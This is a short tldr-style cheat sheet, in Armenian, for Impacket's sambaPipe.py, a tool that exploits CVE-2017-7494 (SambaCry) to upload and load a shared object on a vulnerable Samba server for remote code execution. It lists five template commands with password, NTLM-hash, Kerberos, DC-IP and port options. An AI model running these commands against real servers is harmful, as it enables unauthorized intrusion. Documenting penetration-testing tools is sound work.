# sambaPipe.py

> Օգտագործեք CVE-2017-7494 (SambaCry)՝ ներբեռնելու և բեռնելու ընդհանուր օբյեկտի (SO) ֆայլը խոցելի Samba սերվերի վրա՝ հեռակա կոդի կատարման համար:.
> Impacket փաթեթի մի մասը:.
> Լրացուցիչ տեղեկություններ. <https://github.com/fortra/impacket>:.

- Վերբեռնեք և բեռնեք ընդհանուր օբյեկտի ֆայլը խոցելի Samba սերվերի վրա.:

`sambaPipe.py -so {{path/to/file.so}} {{domain}}/{{username}}:{{password}}@{{target}}`

- Նույնականացրեք՝ օգտագործելով NTLM հեշերը՝ գաղտնաբառի փոխարեն.:

`sambaPipe.py -so {{path/to/file.so}} -hashes {{LM_HASH:NT_HASH}} {{domain}}/{{username}}:{{password}}@{{target}}`

- Օգտագործեք Kerberos նույնականացումը թիրախի համար.:

`sambaPipe.py -so {{path/to/file.so}} -k -no-pass {{domain}}/{{username}}:{{password}}@{{target}}`

- Նշեք տիրույթի վերահսկիչի IP նույնականացման համար.:

`sambaPipe.py -so {{path/to/file.so}} -dc-ip {{dc_ip}} {{domain}}/{{username}}:{{password}}@{{target}}`

- Օգտագործեք հատուկ նավահանգիստ SMB կապի համար.:

`sambaPipe.py -so {{path/to/file.so}} -port {{port}} {{domain}}/{{username}}:{{password}}@{{target}}`
